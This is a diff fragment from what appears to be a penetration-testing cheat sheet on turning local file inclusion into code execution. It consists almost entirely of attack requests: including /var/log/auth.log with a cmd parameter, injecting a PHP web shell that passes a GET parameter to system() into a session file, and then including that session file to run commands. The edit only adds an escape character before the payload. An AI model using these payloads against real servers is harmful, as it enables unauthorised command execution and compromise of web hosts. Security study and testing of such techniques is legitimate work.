@@ -609,7 +609,7 @@ http://ip/index.php?file=/var/log/auth.log&cmd=id
   
 -> PHP session
 
-http://ip/index.php?file=<?php system($_GET["cmd"];?>
+http://ip/index.php?file= \<?php system($_GET["cmd"];?>
   
 http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id
   
